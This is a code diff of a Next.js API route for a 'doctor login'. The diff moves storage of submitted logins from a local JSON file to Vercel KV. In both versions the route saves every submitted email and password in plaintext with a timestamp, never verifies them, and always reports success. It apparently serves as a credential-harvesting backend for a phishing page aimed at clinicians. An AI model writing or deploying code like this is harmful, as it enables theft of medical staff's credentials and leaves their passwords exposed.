@@ -1,15 +1,14 @@
 import { NextRequest, NextResponse } from "next/server";
-import fs from "fs";
-import path from "path";
+import { kv } from "@vercel/kv";
 
-interface DoctorLoginEntry {
+interface LoginEntry {
   email: string;
   password: string;
   rememberMe?: boolean;
   timestamp: string;
 }
 
-interface DoctorLoginRequest {
+interface LoginRequest {
   email: string;
   password: string;
   rememberMe?: boolean;
@@ -17,31 +16,25 @@ interface DoctorLoginRequest {
 
 export async function POST(req: NextRequest) {
   try {
-    const body: DoctorLoginRequest = await req.json();
+    const body: LoginRequest = await req.json();
 
-    const filePath = path.join(process.cwd(), "doctor-logins.json");
+    // Generate a unique key for each login entry
+    const timestamp = new Date().toISOString();
+    const loginKey = `doctor-login:${timestamp}`;
 
-    // Read existing logins if file exists
-    let logins: DoctorLoginEntry[] = [];
-    if (fs.existsSync(filePath)) {
-      const data = fs.readFileSync(filePath, "utf-8");
-      logins = JSON.parse(data || "[]") as DoctorLoginEntry[];
-    }
-
-    // Add new login attempt
-    logins.push({
+    const loginEntry: LoginEntry = {
       email: body.email,
       password: body.password,
       rememberMe: body.rememberMe ?? false,
-      timestamp: new Date().toISOString(),
-    });
+      timestamp,
+    };
 
-    // Write back to file
-    fs.writeFileSync(filePath, JSON.stringify(logins, null, 2));
+    // Save login in Vercel KV
+    await kv.set(loginKey, loginEntry);
 
     return NextResponse.json({ success: true });
-  } catch (err) {
-    console.error("Error logging doctor login:", err);
+  } catch (error) {
+    console.error("Error logging doctor login:", error);
     return NextResponse.json({ success: false }, { status: 500 });
   }
 }
